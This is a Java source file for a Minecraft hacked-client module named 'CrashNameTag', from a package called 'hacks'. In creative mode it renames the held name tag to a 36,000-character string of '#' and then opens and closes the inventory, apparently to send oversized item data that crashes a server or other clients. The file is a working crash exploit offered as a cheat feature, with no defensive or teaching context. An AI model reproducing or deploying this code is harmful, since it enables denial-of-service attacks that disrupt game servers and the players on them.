package me.gishreload.yukon.hacks;

import org.lwjgl.input.Keyboard;

import me.gishreload.yukon.Category;
import me.gishreload.yukon.module.Module;
import net.minecraft.client.Minecraft;
import net.minecraft.client.entity.EntityPlayerSP;
import net.minecraft.client.gui.inventory.GuiInventory;
import net.minecraft.item.ItemNameTag;
import net.minecraft.network.play.client.CPacketPlayer;


public class CrashNameTag extends Module{
	public  CrashNameTag() {
		super("CrashNameTag", 0, Category.OTHER);
	}
	
	@Override
	public void onUpdate() {
		if(this.isToggled()){
			if(mc.thePlayer.inventory.getCurrentItem() == null
					|| !(mc.thePlayer.inventory.getCurrentItem().getItem() instanceof ItemNameTag))
				{
					return;
				}else if(!mc.thePlayer.capabilities.isCreativeMode)
				{
					return;
				}
				String stackName = "";
				for(int i = 0; i < 3000; i++)
				{
					StringBuilder builder = new StringBuilder().append(stackName);
					stackName = builder.append("############").toString();
				}
				mc.thePlayer.inventory.getCurrentItem().setStackDisplayName(stackName);
				mc.displayGuiScreen(new GuiInventory(mc.thePlayer));
				mc.thePlayer.closeScreen();
		}
	super.onUpdate();
	}
	}



